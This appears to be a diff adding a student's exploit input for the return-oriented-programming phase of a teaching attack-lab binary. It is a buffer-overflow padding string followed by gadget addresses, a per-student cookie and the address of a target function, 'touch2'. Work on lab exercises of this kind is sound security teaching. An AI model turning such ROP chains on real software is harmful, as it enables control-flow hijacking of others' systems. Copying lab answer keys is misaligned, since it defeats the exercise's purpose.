@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+83 16 40 00 00 00 00 00 /* gadget 1: popq %rax address starts at last byte */
+ff b0 07 5f 00 00 00 00 /* my cookie */
+6d 16 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
+a6 14 40 00 00 00 00 00 /* address touch2 */
